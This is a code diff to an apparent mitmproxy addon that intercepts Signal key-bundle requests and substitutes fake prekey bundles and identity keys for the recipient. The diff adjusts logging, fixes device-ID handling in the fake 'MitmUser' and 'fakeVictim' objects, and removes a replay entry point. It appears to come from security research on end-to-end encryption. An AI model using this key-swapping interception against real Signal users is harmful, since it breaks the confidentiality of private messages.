@@ -30,6 +30,11 @@ from collections import defaultdict
 
 
 # logging.getLogger().addHandler(utils.ColorHandler())
+logging.getLogger('passlib').setLevel(logging.ERROR)  # suppressing an issue coming from xepor -> passlib
+logging.getLogger('peewee').setLevel(logging.WARN)  # peewee emits full SQL queries otherwise which is not great
+logging.getLogger('xepor.xepor').setLevel(logging.INFO)
+FORMAT = "[%(filename)s:%(lineno)s - %(funcName)20s()] %(message)s"
+logging.basicConfig(format=FORMAT)
 
 class CiphertextMessageType(Enum):
     WHISPER = 2
@@ -331,7 +336,9 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         bob_bundle = bob_bundle.with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
                                                    kem.PublicKey.deserialize(bob_kyber_pre_key_public),
                                                    bob_kyber_pre_key_signature)
+        assert bob_bundle.device_id().get_id() > 0
 
+        logging.warning(registration_info[ip_address])
         lastResortPq = registration_info[ip_address].aciData if identifier == "aci" else registration_info[
             ip_address].pniData
 
@@ -348,7 +355,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             lastResortKyber=lastResortPq.pq_lastResortKey  # need to get from registration_info
         )
         legit_bundle.on_conflict_replace().execute()
-        fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, id), bob_bundle)
+        fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, device_id), bob_bundle)
 
     ############ Swap the prekeybundle TODO 
 
@@ -359,15 +366,15 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         #                                             MitMBundle.deviceId == device_id).first()
 
         identity_key = bobs_bundle.get(uuid)
+        bob_device_id = int(bundle["deviceId"])
 
         if not identity_key:
             # todo create row
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, id))
-            # identity_key = fakeUser.pre_key_bundle.identity_key()
+            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, bob_device_id))
             identity_key = fakeUser.identity_key_pair
 
         else:
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, id), identity_key=identity_key.fake_identityKey)
+            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, bob_device_id), identity_key=identity_key.fake_identityKey)
             identity_key = identity_key.fake_identityKey
 
         fakeBundle = fakeUser.pre_key_bundle.to_dict()
@@ -681,16 +688,3 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
 
 
 addons = [api]
-
-from mitmproxy.tools.main import mitmproxy, mitmdump
-
-if __name__ == "__main__":
-    mitmdump(
-        [
-            "-q",      # quiet flag, only script's output
-            "-s",      # script flag
-            __file__,  # use the same file as the hook
-            "-r",
-            "mitmproxy_flows/new/23_04_kyber_messages"
-        ]
-    )
